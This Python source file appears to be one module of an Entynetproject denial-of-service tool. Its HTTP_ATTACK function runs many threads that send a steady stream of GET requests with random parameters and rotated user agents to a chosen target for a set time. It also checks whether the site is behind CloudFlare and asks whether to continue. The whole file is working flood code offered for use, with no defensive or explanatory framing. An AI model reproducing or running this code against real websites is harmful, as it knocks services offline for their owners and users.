#!/usr/bin/env python3

# MIT License
#
# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import requests
import random
import time
from threading import Thread
# Import modules for HTTP flood
import tools.randomData as randomData
import tools.ipTools as ipTools

def HTTP_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	if ipTools.isCloudFlare(target):
		if not input("\033[1;33m"+"[!]"+"\033[0m"+" Current site is under CloudFlare protection. \n"+"\033[1m"+"[?]"+"\033[0m"+"Continue? y/N: ") in ("y", "Y", "1"):
			exit()

	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting attack...")
	
	threads_list = []
	# Load 25 random user agents
	user_agents = []
	for _ in range(threads):
		user_agents.append( randomData.random_useragent() )


	# HTTP flood
	def http_flood():
		global FINISH
		while True:
			if FINISH:
				break
			payload = str(random._urandom(random.randint(1, 30)))
			headers = {
				"X-Requested-With": "XMLHttpRequest",
				"Connection": "keep-alive",
				"Pragma": "no-cache",
				"Cache-Control": "no-cache",
				"Accept-Encoding": "gzip, deflate, br",
				"User-agent": random.choice(user_agents)
			}
			try:
				r = requests.get(target, params = payload)
			except Exception as e:
				print(e)
				time.sleep(2)
			else:
				print("\033[1;32m"+"[+]"+"\033[0m"+" Package was sent! Package size: " + str(len(payload)) + ".")


	# Start threads
	for thread in range(0, threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
		t = Thread(target = http_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;33m"+"[!]"+"\033[0m"+" HTTP attack stopped.")
